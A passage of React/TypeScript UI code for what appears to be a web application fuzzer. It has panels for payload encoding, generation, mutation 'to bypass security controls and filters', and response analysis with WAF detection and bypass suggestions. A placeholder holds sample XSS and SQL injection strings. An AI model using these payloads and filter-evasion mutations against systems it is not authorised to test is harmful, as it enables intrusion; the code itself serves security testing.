                                  result = btoa(result);
                                  break;
                                case "hex":
                                  result = Array.from(result).map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
                                  break;
                                case "reverse":
                                  result = result.split("").reverse().join("");
                                  break;
                                case "lowercase":
                                  result = result.toLowerCase();
                                  break;
                                case "uppercase":
                                  result = result.toUpperCase();
                                  break;
                                case "strip_spaces":
                                  result = result.replace(/\s/g, "");
                                  break;
                                case "html_entities":
                                  result = result.replace(/[<>&"']/g, c => ({
                                    "<": "&lt;", ">": "&gt;", "&": "&amp;", "\"": "&quot;", "'": "&#x27;"
                                  })[c] || c);
                                  break;
                                case "unicode":
                                  result = Array.from(result).map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("");
                                  break;
                                default:
                                  break;
                              }
                              steps.push({ step: enc, value: result });
                            } catch (e) {
                              steps.push({ step: enc, value: `[Error: ${e}]` });
                            }
                          });
                          
                          return (
                            <Box key={i} sx={{ mb: 2, pb: 2, borderBottom: i < 2 ? "1px solid rgba(255,255,255,0.1)" : "none" }}>
                              <Box sx={{ display: "flex", alignItems: "center", gap: 1, flexWrap: "wrap" }}>
                                {steps.map((step, j) => (
                                  <React.Fragment key={j}>
                                    {j > 0 && <NavigateNextIcon sx={{ color: "rgba(255,255,255,0.3)" }} fontSize="small" />}
                                    <Tooltip title={step.value.length > 50 ? step.value : ""}>
                                      <Box sx={{ 
                                        display: "flex", 
                                        flexDirection: "column", 
                                        alignItems: "center",
                                        maxWidth: 150,
                                      }}>
                                        <Typography variant="caption" color="primary.light" fontSize={10}>
                                          {step.step}
                                        </Typography>
                                        <Typography 
                                          variant="caption" 
                                          sx={{ 
                                            fontFamily: "monospace", 
                                            color: j === steps.length - 1 ? "#4ade80" : "#d4d4d4",
                                            maxWidth: 150,
                                            overflow: "hidden",
                                            textOverflow: "ellipsis",
                                            whiteSpace: "nowrap",
                                          }}
                                        >
                                          {step.value.slice(0, 30)}{step.value.length > 30 ? "..." : ""}
                                        </Typography>
                                      </Box>
                                    </Tooltip>
                                  </React.Fragment>
                                ))}
                              </Box>
                            </Box>
                          );
                        })}
                        {encodingInput.split("\n").filter(p => p.trim()).length > 3 && (
                          <Typography variant="caption" color="text.secondary">
                            + {encodingInput.split("\n").filter(p => p.trim()).length - 3} more payloads...
                          </Typography>
                        )}
                      </Paper>
                    )}
                  </CardContent>
                </Card>
              </Grid>
            )}

            {/* Generator Tab */}
            {advancedTab === 1 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <AutorenewIcon color="primary" />
                      Payload Generator
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph>
                      Generate payloads programmatically using various patterns and ranges.
                    </Typography>
                    
                    <Grid container spacing={2}>
                      <Grid item xs={12} md={4}>
                        <FormControl fullWidth>
                          <InputLabel>Generator Type</InputLabel>
                          <Select
                            value={generatorType}
                            label="Generator Type"
                            onChange={(e) => {
                              setGeneratorType(e.target.value);
                              // Set default params for each type
                              const defaults: Record<string, any> = {
                                number_range: { start: 1, end: 100, step: 1, padding: 0 },
                                char_range: { start: "a", end: "z" },
                                date_range: { start: "2024-01-01", end: "2024-12-31", format: "%Y-%m-%d" },
                                uuid: { count: 10 },
                                pattern: { pattern: "user[0-9]{4}", count: 10 },
                              };
                              setGeneratorParams(defaults[e.target.value] || {});
                            }}
                          >
                            <MenuItem value="number_range">Number Range</MenuItem>
                            <MenuItem value="char_range">Character Range</MenuItem>
                            <MenuItem value="date_range">Date Range</MenuItem>
                            <MenuItem value="uuid">UUID Generator</MenuItem>
                            <MenuItem value="pattern">Pattern Generator</MenuItem>
                          </Select>
                        </FormControl>
                      </Grid>
                      
                      <Grid item xs={12} md={8}>
                        <Typography variant="subtitle2" gutterBottom>Generator Parameters</Typography>
                        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                          {generatorType === "number_range" && (
                            <>
                              <TextField
                                size="small"
                                label="Start"
                                type="number"
                                value={generatorParams.start || 1}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, start: parseInt(e.target.value) }))}
                                sx={{ width: 100 }}
                              />
                              <TextField
                                size="small"
                                label="End"
                                type="number"
                                value={generatorParams.end || 100}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, end: parseInt(e.target.value) }))}
                                sx={{ width: 100 }}
                              />
                              <TextField
                                size="small"
                                label="Step"
                                type="number"
                                value={generatorParams.step || 1}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, step: parseInt(e.target.value) }))}
                                sx={{ width: 80 }}
                              />
                              <TextField
                                size="small"
                                label="Padding"
                                type="number"
                                value={generatorParams.padding || 0}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, padding: parseInt(e.target.value) }))}
                                sx={{ width: 80 }}
                                helperText="0001"
                              />
                            </>
                          )}
                          {generatorType === "char_range" && (
                            <>
                              <TextField
                                size="small"
                                label="Start Char"
                                value={generatorParams.start || "a"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, start: e.target.value.slice(-1) }))}
                                sx={{ width: 100 }}
                              />
                              <TextField
                                size="small"
                                label="End Char"
                                value={generatorParams.end || "z"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, end: e.target.value.slice(-1) }))}
                                sx={{ width: 100 }}
                              />
                            </>
                          )}
                          {generatorType === "date_range" && (
                            <>
                              <TextField
                                size="small"
                                label="Start Date"
                                type="date"
                                value={generatorParams.start || "2024-01-01"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, start: e.target.value }))}
                                InputLabelProps={{ shrink: true }}
                              />
                              <TextField
                                size="small"
                                label="End Date"
                                type="date"
                                value={generatorParams.end || "2024-12-31"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, end: e.target.value }))}
                                InputLabelProps={{ shrink: true }}
                              />
                              <TextField
                                size="small"
                                label="Format"
                                value={generatorParams.format || "%Y-%m-%d"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, format: e.target.value }))}
                                sx={{ width: 150 }}
                              />
                            </>
                          )}
                          {generatorType === "uuid" && (
                            <TextField
                              size="small"
                              label="Count"
                              type="number"
                              value={generatorParams.count || 10}
                              onChange={(e) => setGeneratorParams(prev => ({ ...prev, count: parseInt(e.target.value) }))}
                              sx={{ width: 100 }}
                            />
                          )}
                          {generatorType === "pattern" && (
                            <>
                              <TextField
                                size="small"
                                label="Pattern"
                                value={generatorParams.pattern || "user[0-9]{4}"}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, pattern: e.target.value }))}
                                sx={{ width: 200 }}
                                helperText="[a-z], [0-9], {n}"
                              />
                              <TextField
                                size="small"
                                label="Count"
                                type="number"
                                value={generatorParams.count || 10}
                                onChange={(e) => setGeneratorParams(prev => ({ ...prev, count: parseInt(e.target.value) }))}
                                sx={{ width: 100 }}
                              />
                            </>
                          )}
                        </Box>
                      </Grid>
                      
                      <Grid item xs={12}>
                        <Button
                          variant="contained"
                          onClick={async () => {
                            try {
                              const result = await fuzzer.generate(generatorType, generatorParams);
                              setGeneratedPayloads(result.payloads);
                            } catch (e: any) {
                              console.error("Generation failed:", e);
                            }
                          }}
                        >
                          Generate Payloads
                        </Button>
                        <Button
                          sx={{ ml: 1 }}
                          onClick={() => {
                            setConfig(prev => ({
                              ...prev,
                              payloads: [generatedPayloads]
                            }));
                          }}
                          disabled={generatedPayloads.length === 0}
                        >
                          Add to Payloads ({generatedPayloads.length})
                        </Button>
                      </Grid>
                      
                      {generatedPayloads.length > 0 && (
                        <Grid item xs={12}>
                          <Typography variant="subtitle2" gutterBottom>
                            Generated Payloads ({generatedPayloads.length})
                          </Typography>
                          <Paper variant="outlined" sx={{ p: 2, maxHeight: 200, overflow: "auto" }}>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                              {generatedPayloads.slice(0, 100).map((payload, idx) => (
                                <Chip key={idx} label={payload} size="small" variant="outlined" />
                              ))}
                              {generatedPayloads.length > 100 && (
                                <Chip label={`+${generatedPayloads.length - 100} more`} size="small" color="primary" />
                              )}
                            </Box>
                          </Paper>
                        </Grid>
                      )}
                    </Grid>
                  </CardContent>
                </Card>
              </Grid>
            )}

            {/* Mutation Tab */}
            {advancedTab === 2 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <AutoFixHighIcon color="primary" />
                      Payload Mutation
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph>
                      Generate variations of payloads to bypass security controls and filters.
                    </Typography>
                    
                    <Grid container spacing={2}>
                      <Grid item xs={12} md={6}>
                        <TextField
                          fullWidth
                          multiline
                          rows={4}
                          label="Payloads to Mutate (one per line)"
                          placeholder="<script>alert(1)</script>&#10;' OR '1'='1"
                          value={mutationInput}
                          onChange={(e) => setMutationInput(e.target.value)}
                        />
                      </Grid>
                      <Grid item xs={12} md={6}>
                        <Typography variant="subtitle2" gutterBottom>Mutation Types</Typography>
                        <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                          {[
                            { value: "case", label: "Case Variations", desc: "upper, lower, swap" },
                            { value: "encoding", label: "Encoding", desc: "URL, HTML, Unicode" },
                            { value: "whitespace", label: "Whitespace", desc: "tabs, newlines, spaces" },
                            { value: "null_byte", label: "Null Bytes", desc: "%00, \\x00" },
                            { value: "comment", label: "Comments", desc: "/**/, //, <!--" },
                            { value: "concatenation", label: "Concatenation", desc: "'+', '||'" },
                          ].map(mut => (
                            <Tooltip key={mut.value} title={mut.desc}>
                              <Chip
                                label={mut.label}
                                clickable
                                color={selectedMutations.includes(mut.value) ? "primary" : "default"}
                                onClick={() => {
                                  setSelectedMutations(prev => 
                                    prev.includes(mut.value) 
                                      ? prev.filter(m => m !== mut.value)
                                      : [...prev, mut.value]
                                  );
                                }}
                              />
                            </Tooltip>
                          ))}
                        </Box>
                        <Box sx={{ mt: 2 }}>
                          <Button
                            variant="contained"
                            onClick={async () => {
                              const payloads = mutationInput.split("\n").filter(p => p.trim());
                              if (payloads.length === 0) return;
                              try {
                                const result = await fuzzer.mutate(payloads, selectedMutations);
                                setMutatedResults(result.mutations);
                              } catch (e: any) {
                                console.error("Mutation failed:", e);
                              }
                            }}
                            disabled={!mutationInput.trim() || selectedMutations.length === 0}
                          >
                            Generate Mutations
                          </Button>
                          <Button
                            sx={{ ml: 1 }}
                            onClick={() => {
                              const allMutated = Object.values(mutatedResults).flat();
                              setConfig(prev => ({
                                ...prev,
                                payloads: [allMutated]
                              }));
                            }}
                            disabled={Object.keys(mutatedResults).length === 0}
                          >
                            Add to Payloads
                          </Button>
                        </Box>
                      </Grid>
                      
                      {Object.keys(mutatedResults).length > 0 && (
                        <Grid item xs={12}>
                          <Typography variant="subtitle2" gutterBottom>
                            Mutated Payloads ({Object.values(mutatedResults).flat().length} variants)
                          </Typography>
                          <Paper variant="outlined" sx={{ p: 2, maxHeight: 300, overflow: "auto" }}>
                            {Object.entries(mutatedResults).map(([original, mutations]) => (
                              <Box key={original} sx={{ mb: 2 }}>
                                <Typography variant="caption" color="primary.main" sx={{ fontFamily: "monospace" }}>
                                  Original: {original}
                                </Typography>
                                <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mt: 0.5 }}>
                                  {mutations.slice(0, 20).map((mut, idx) => (
                                    <Chip 
                                      key={idx} 
                                      label={mut.length > 40 ? mut.slice(0, 40) + "..." : mut} 
                                      size="small" 
                                      variant="outlined"
                                      onClick={() => navigator.clipboard.writeText(mut)}
                                    />
                                  ))}
                                  {mutations.length > 20 && (
                                    <Chip label={`+${mutations.length - 20} more`} size="small" color="primary" />
                                  )}
                                </Box>
                              </Box>
                            ))}
                          </Paper>
                        </Grid>
                      )}
                    </Grid>
                  </CardContent>
                </Card>
              </Grid>
            )}

            {/* Response Analysis Tab */}
            {advancedTab === 3 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <AssessmentIcon color="primary" />
                      Response Analysis
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph>
                      Analyze fuzzing responses for WAF detection, rate limiting, parameter discovery, and data extraction.
                    </Typography>
                    
                    {results.length === 0 ? (
                      <Alert severity="info">
                        Run a fuzzing session first to analyze responses. Go to the Results tab after running a scan.
                      </Alert>
                    ) : (
                      <Box>
                        <Button
                          variant="contained"
                          startIcon={analyzingResponses ? <CircularProgress size={20} color="inherit" /> : <SearchIcon />}
                          onClick={async () => {
                            setAnalyzingResponses(true);
                            try {
                              // Convert frontend results to API format
                              const apiResponses = results.map(r => ({
                                id: r.id,
                                payload: r.payload,
                                status_code: r.statusCode,
                                response_length: r.responseLength,
                                response_time: r.responseTime,
                                content_type: r.contentType,
                                headers: r.headers,
                                body: r.body || "",
                                timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
                                interesting: r.interesting,
                                flags: r.flags,
                              }));
                              
                              const analysis = await fuzzer.analyze(apiResponses, {
                                detectWaf: true,
                                detectRateLimit: true,
                                discoverParams: true,
                                clusterResponses: true,
                                extractData: true,
                              });
                              setAnalysisResults(analysis);
                            } catch (e: any) {
                              console.error("Analysis failed:", e);
                            } finally {
                              setAnalyzingResponses(false);
                            }
                          }}
                          disabled={analyzingResponses}
                          sx={{ mb: 2 }}
                        >
                          {analyzingResponses ? "Analyzing..." : `Analyze ${results.length} Responses`}
                        </Button>
                        
                        {analysisResults && (
                          <Grid container spacing={2}>
                            {/* WAF Detection */}
                            {analysisResults.waf_detection && (
                              <Grid item xs={12} md={6}>
                                <Paper sx={{ p: 2, height: "100%" }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                    <ShieldIcon color={analysisResults.waf_detection.detected ? "warning" : "success"} />
                                    WAF Detection
                                  </Typography>
                                  {analysisResults.waf_detection.detected ? (
                                    <Box>
                                      <Alert severity="warning" sx={{ mb: 1 }}>
                                        WAF Detected: <strong>{analysisResults.waf_detection.waf_type}</strong>
                                        (Confidence: {Math.round(analysisResults.waf_detection.confidence * 100)}%)
                                      </Alert>
                                      <Typography variant="caption" color="text.secondary">Indicators:</Typography>
                                      <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mb: 1 }}>
                                        {analysisResults.waf_detection.indicators.map((ind: string, i: number) => (
                                          <Chip key={i} label={ind} size="small" color="warning" variant="outlined" />
                                        ))}
                                      </Box>
                                      <Typography variant="caption" color="text.secondary">Bypass Suggestions:</Typography>
                                      <List dense>
                                        {analysisResults.waf_detection.bypass_suggestions?.slice(0, 5).map((sug: string, i: number) => (
                                          <ListItem key={i} sx={{ py: 0 }}>
                                            <ListItemIcon sx={{ minWidth: 24 }}>
                                              <TipsAndUpdatesIcon fontSize="small" color="info" />
                                            </ListItemIcon>
                                            <ListItemText primary={sug} primaryTypographyProps={{ variant: "body2" }} />
                                          </ListItem>
                                        ))}
                                      </List>
                                    </Box>
                                  ) : (
                                    <Alert severity="success">No WAF detected in responses</Alert>
                                  )}
                                </Paper>
                              </Grid>
                            )}
                            
                            {/* Rate Limiting */}
                            {analysisResults.rate_limiting && (
                              <Grid item xs={12} md={6}>
                                <Paper sx={{ p: 2, height: "100%" }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                    <SpeedIcon color={analysisResults.rate_limiting.detected ? "warning" : "success"} />
                                    Rate Limiting
                                  </Typography>
                                  {analysisResults.rate_limiting.detected ? (
                                    <Box>
                                      <Alert severity="warning" sx={{ mb: 1 }}>
                                        Rate Limiting Detected ({analysisResults.rate_limiting.limit_type})
                                      </Alert>
                                      {analysisResults.rate_limiting.threshold && (
                                        <Typography variant="body2">
                                          Threshold: ~{analysisResults.rate_limiting.threshold} requests
                                        </Typography>
                                      )}
                                      {analysisResults.rate_limiting.retry_after && (
                                        <Typography variant="body2">
                                          Retry After: {analysisResults.rate_limiting.retry_after}s
                                        </Typography>
                                      )}
                                      <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mt: 1 }}>
                                        {analysisResults.rate_limiting.indicators.map((ind: string, i: number) => (
                                          <Chip key={i} label={ind} size="small" variant="outlined" />
                                        ))}
                                      </Box>
                                    </Box>
                                  ) : (
                                    <Alert severity="success">No rate limiting detected</Alert>
                                  )}
                                </Paper>
                              </Grid>
                            )}
                            
                            {/* Discovered Parameters */}
                            {analysisResults.discovered_parameters && analysisResults.discovered_parameters.length > 0 && (
                              <Grid item xs={12} md={6}>
                                <Paper sx={{ p: 2, height: "100%" }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                    <CategoryIcon color="info" />
                                    Discovered Parameters ({analysisResults.discovered_parameters.length})
                                  </Typography>
                                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, maxHeight: 200, overflow: "auto" }}>
                                    {analysisResults.discovered_parameters.map((param: any, i: number) => (
                                      <Tooltip key={i} title={`Source: ${param.source}, Type: ${param.param_type}`}>
                                        <Chip 
                                          label={param.name} 
                                          size="small" 
                                          color={param.source === "html_form" ? "primary" : "default"}
                                          variant="outlined"
                                          onClick={() => navigator.clipboard.writeText(param.name)}
                                        />
                                      </Tooltip>
                                    ))}
                                  </Box>
                                </Paper>
                              </Grid>
                            )}
                            
                            {/* Extracted Data */}
                            {analysisResults.extracted_data && Object.keys(analysisResults.extracted_data).length > 0 && (
                              <Grid item xs={12} md={6}>
                                <Paper sx={{ p: 2, height: "100%" }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                    <DataObjectIcon color="secondary" />
                                    Extracted Data
                                  </Typography>
                                  <Box sx={{ maxHeight: 200, overflow: "auto" }}>
                                    {Object.entries(analysisResults.extracted_data).map(([type, values]: [string, any]) => (
                                      <Box key={type} sx={{ mb: 1 }}>
                                        <Typography variant="caption" color="text.secondary">{type}:</Typography>
                                        <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                                          {values.slice(0, 5).map((v: string, i: number) => (
                                            <Chip 
                                              key={i} 
                                              label={v.length > 30 ? v.slice(0, 30) + "..." : v} 
                                              size="small" 
                                              variant="outlined"
                                              onClick={() => navigator.clipboard.writeText(v)}
                                            />
                                          ))}
                                          {values.length > 5 && (
                                            <Chip label={`+${values.length - 5} more`} size="small" color="primary" />
                                          )}
                                        </Box>
                                      </Box>
                                    ))}
                                  </Box>
                                </Paper>
                              </Grid>
                            )}
                            
                            {/* Clustering */}
                            {analysisResults.clustering && (
                              <Grid item xs={12}>
                                <Paper sx={{ p: 2 }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom>
                                    Response Clustering ({analysisResults.clustering.total_clusters} clusters)
                                  </Typography>
                                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                                    {analysisResults.clustering.clusters.map((cluster: any, i: number) => (
                                      <Chip 
                                        key={i}
                                        label={`Cluster ${i + 1}: ${cluster.count} responses (${cluster.status_code})`}
                                        color={cluster.count === 1 ? "warning" : "default"}
                                        variant={analysisResults.clustering.anomalous_responses?.some((id: string) => 
                                          cluster.response_ids.includes(id)
                                        ) ? "filled" : "outlined"}
                                      />
                                    ))}
                                  </Box>
                                  {analysisResults.clustering.anomalous_responses?.length > 0 && (
                                    <Alert severity="info" sx={{ mt: 1 }}>
                                      {analysisResults.clustering.anomalous_responses.length} potentially anomalous response(s) found
                                    </Alert>
                                  )}
                                </Paper>
                              </Grid>
                            )}
                            
                            {/* Statistics */}
                            {analysisResults.statistics && (
                              <Grid item xs={12}>
                                <Paper sx={{ p: 2 }}>
                                  <Typography variant="subtitle1" fontWeight={600} gutterBottom>Statistics</Typography>
                                  <Grid container spacing={2}>
                                    <Grid item xs={6} sm={3}>
                                      <Typography variant="caption" color="text.secondary">Unique Status Codes</Typography>
                                      <Typography variant="h6">{analysisResults.statistics.unique_status_codes?.length || 0}</Typography>
                                    </Grid>
                                    <Grid item xs={6} sm={3}>
                                      <Typography variant="caption" color="text.secondary">Avg Response Time</Typography>
                                      <Typography variant="h6">{Math.round(analysisResults.statistics.avg_response_time || 0)}ms</Typography>
                                    </Grid>
                                    <Grid item xs={6} sm={3}>
                                      <Typography variant="caption" color="text.secondary">Avg Response Length</Typography>
                                      <Typography variant="h6">{Math.round(analysisResults.statistics.avg_response_length || 0)}</Typography>
                                    </Grid>
                                    <Grid item xs={6} sm={3}>
                                      <Typography variant="caption" color="text.secondary">Interesting</Typography>
                                      <Typography variant="h6" color="warning.main">{analysisResults.statistics.interesting_count || 0}</Typography>
                                    </Grid>
                                  </Grid>
                                </Paper>
                              </Grid>
                            )}
                          </Grid>
                        )}
                      </Box>
                    )}
                  </CardContent>
                </Card>
              </Grid>
            )}
          </Grid>
        </Box>
      )}

      {/* Tab 5: Results */}
      {activeTab === 5 && (
        <Box>
          {/* Filters */}
          <Card sx={{ mb: 2 }}>
            <CardContent sx={{ py: 1.5 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, flexWrap: "wrap" }}>
                <FilterListIcon color="action" />
                <TextField
                  size="small"
                  label="Status Code"
                  placeholder="200"
                  value={resultFilter.statusCode}
                  onChange={(e) => setResultFilter(prev => ({ ...prev, statusCode: e.target.value }))}
                  sx={{ width: 120 }}
                />
                <TextField
                  size="small"
                  label="Min Length"
                  type="number"
                  value={resultFilter.minLength}
                  onChange={(e) => setResultFilter(prev => ({ ...prev, minLength: e.target.value }))}
                  sx={{ width: 120 }}
                />
                <TextField
                  size="small"
                  label="Max Length"
                  type="number"
                  value={resultFilter.maxLength}
                  onChange={(e) => setResultFilter(prev => ({ ...prev, maxLength: e.target.value }))}
                  sx={{ width: 120 }}
                />
                <FormControlLabel
                  control={
                    <Checkbox
                      checked={resultFilter.interestingOnly}
                      onChange={(e) => setResultFilter(prev => ({ ...prev, interestingOnly: e.target.checked }))}
                      size="small"
                    />
                  }
                  label="Interesting Only"
                />
                <Divider orientation="vertical" flexItem sx={{ mx: 1 }} />
                <FormControlLabel
                  control={
                    <Switch
                      checked={compareMode}
                      onChange={(e) => {
                        setCompareMode(e.target.checked);
                        if (!e.target.checked) {
                          setCompareResults([null, null]);
                        }
                      }}
                      size="small"
                    />
                  }
                  label="Compare Mode"
                />
                {compareMode && (
                  <Button
                    variant="contained"
                    size="small"
                    startIcon={<SearchIcon />}
                    onClick={openCompareDialog}
                    disabled={!compareResults[0] || !compareResults[1]}
                  >
                    Compare ({compareResults.filter(Boolean).length}/2)
                  </Button>
                )}
                <Box sx={{ flexGrow: 1 }} />
                <ButtonGroup variant="outlined" disabled={results.length === 0 || exportLoading}>
                  <Button
                    startIcon={exportLoading ? <CircularProgress size={16} /> : <DownloadIcon />}
                    onClick={(e) => setExportMenuAnchor(e.currentTarget)}
                  >
                    Export
                  </Button>
                </ButtonGroup>
                <Menu
                  anchorEl={exportMenuAnchor}
                  open={Boolean(exportMenuAnchor)}
                  onClose={() => setExportMenuAnchor(null)}
                >
                  <MenuItem onClick={() => exportReport("json")}>
                    <ListItemIcon><CodeIcon fontSize="small" /></ListItemIcon>
                    <ListItemText>JSON</ListItemText>
                  </MenuItem>
                  <MenuItem onClick={() => exportReport("markdown")}>
                    <ListItemIcon><ArticleIcon fontSize="small" /></ListItemIcon>
                    <ListItemText>Markdown</ListItemText>
                  </MenuItem>
                  <Divider />
                  <MenuItem onClick={() => exportReport("pdf")}>
                    <ListItemIcon><PictureAsPdfIcon fontSize="small" /></ListItemIcon>
                    <ListItemText>PDF</ListItemText>
                  </MenuItem>
                  <MenuItem onClick={() => exportReport("docx")}>
                    <ListItemIcon><DescriptionIcon fontSize="small" /></ListItemIcon>
                    <ListItemText>Word (DOCX)</ListItemText>
                  </MenuItem>
                </Menu>
              </Box>

              {/* Advanced Filters Toggle */}
              <Box 
                sx={{ 
                  mt: 1.5, 
                  pt: 1.5, 
                  borderTop: showAdvancedFilters ? `1px solid ${alpha("#000", 0.1)}` : "none",
                  display: "flex",
                  alignItems: "center",
                  cursor: "pointer",
                }}
                onClick={() => setShowAdvancedFilters(!showAdvancedFilters)}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <ExpandMoreIcon 
                    sx={{ 
                      transform: showAdvancedFilters ? "rotate(180deg)" : "rotate(0deg)",
                      transition: "transform 0.2s ease",
                      fontSize: 20,
                      color: "text.secondary",
                    }} 
                  />
                  <Typography variant="body2" color="text.secondary">
                    Advanced Filters
                  </Typography>
                  {(resultFilter.excludeStatusCodes || resultFilter.regexPattern || resultFilter.excludePattern || 
                    resultFilter.minResponseTime || resultFilter.maxResponseTime || resultFilter.contentType ||
                    resultFilter.showOnlyErrors || resultFilter.showOnlySuccess || resultFilter.hideReflected || resultFilter.showOnlyReflected) && (
                    <Chip label="Active" size="small" color="primary" sx={{ height: 20, fontSize: "0.7rem" }} />
                  )}
                </Box>
              </Box>

              {/* Advanced Filters Panel */}
              <Collapse in={showAdvancedFilters}>
                <Box sx={{ mt: 2 }}>
                  <Grid container spacing={2}>
                    {/* Row 1: Exclude Status Codes & Response Time */}
                    <Grid item xs={12} md={4}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Exclude Status Codes"
                        placeholder="404,500,503"
                        value={resultFilter.excludeStatusCodes}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, excludeStatusCodes: e.target.value }))}
                        helperText="Comma-separated codes to hide"
                        InputProps={{
                          startAdornment: (
                            <InputAdornment position="start">
                              <BlockIcon fontSize="small" color="error" />
                            </InputAdornment>
                          ),
                        }}
                      />
                    </Grid>
                    <Grid item xs={12} md={4}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Min Response Time (ms)"
                        type="number"
                        value={resultFilter.minResponseTime}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, minResponseTime: e.target.value }))}
                        helperText="Show responses slower than this"
                        InputProps={{
                          startAdornment: (
                            <InputAdornment position="start">
                              <TimerIcon fontSize="small" color="primary" />
                            </InputAdornment>
                          ),
                        }}
                      />
                    </Grid>
                    <Grid item xs={12} md={4}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Max Response Time (ms)"
                        type="number"
                        value={resultFilter.maxResponseTime}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, maxResponseTime: e.target.value }))}
                        helperText="Show responses faster than this"
                        InputProps={{
                          startAdornment: (
                            <InputAdornment position="start">
                              <TimerIcon fontSize="small" color="primary" />
                            </InputAdornment>
                          ),
                        }}
                      />
                    </Grid>

                    {/* Row 2: Regex Pattern & Exclude Pattern */}
                    <Grid item xs={12} md={6}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Regex Pattern (Match)"
                        placeholder="error|exception|sql"
                        value={resultFilter.regexPattern}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, regexPattern: e.target.value }))}
                        helperText="Show results where response matches this regex"
                        InputProps={{
                          startAdornment: (
                            <InputAdornment position="start">
                              <SearchIcon fontSize="small" color="success" />
                            </InputAdornment>
                          ),
                        }}
                      />
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Exclude Pattern"
                        placeholder="Not Found|Access Denied"
                        value={resultFilter.excludePattern}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, excludePattern: e.target.value }))}
                        helperText="Hide results where response matches this pattern"
                        InputProps={{
                          startAdornment: (
                            <InputAdornment position="start">
                              <BlockIcon fontSize="small" color="error" />
                            </InputAdornment>
                          ),
                        }}
                      />
                    </Grid>

                    {/* Row 3: Content Type */}
                    <Grid item xs={12} md={4}>
                      <TextField
                        fullWidth
                        size="small"
                        label="Content Type"
                        placeholder="application/json"
                        value={resultFilter.contentType}
                        onChange={(e) => setResultFilter(prev => ({ ...prev, contentType: e.target.value }))}
                        helperText="Filter by response content type"
                      />
                    </Grid>

                    {/* Row 4: Quick Filters */}
                    <Grid item xs={12}>
                      <Typography variant="subtitle2" color="text.secondary" sx={{ mb: 1 }}>
                        Quick Filters
                      </Typography>
                      <Box sx={{ display: "flex", gap: 2, flexWrap: "wrap" }}>
                        <FormControlLabel
                          control={
                            <Checkbox
                              checked={resultFilter.showOnlyErrors}
                              onChange={(e) => setResultFilter(prev => ({ 
                                ...prev, 
                                showOnlyErrors: e.target.checked,
                                showOnlySuccess: e.target.checked ? false : prev.showOnlySuccess,
                              }))}
                              size="small"
                              color="error"
                            />
                          }
                          label={
                            <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                              <Typography variant="body2">Errors Only</Typography>
                              <Chip label="4xx/5xx" size="small" color="error" variant="outlined" sx={{ height: 18, fontSize: "0.65rem" }} />
                            </Box>
                          }
                        />
                        <FormControlLabel
                          control={
                            <Checkbox
                              checked={resultFilter.showOnlySuccess}
                              onChange={(e) => setResultFilter(prev => ({ 
                                ...prev, 
                                showOnlySuccess: e.target.checked,
                                showOnlyErrors: e.target.checked ? false : prev.showOnlyErrors,
                              }))}
                              size="small"
                              color="success"
                            />
                          }
                          label={
                            <Box sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                              <Typography variant="body2">Success Only</Typography>
                              <Chip label="2xx" size="small" color="success" variant="outlined" sx={{ height: 18, fontSize: "0.65rem" }} />
                            </Box>
                          }
                        />
                        <Divider orientation="vertical" flexItem />
                        <FormControlLabel
                          control={
                            <Checkbox
                              checked={resultFilter.showOnlyReflected}
                              onChange={(e) => setResultFilter(prev => ({ 
                                ...prev, 
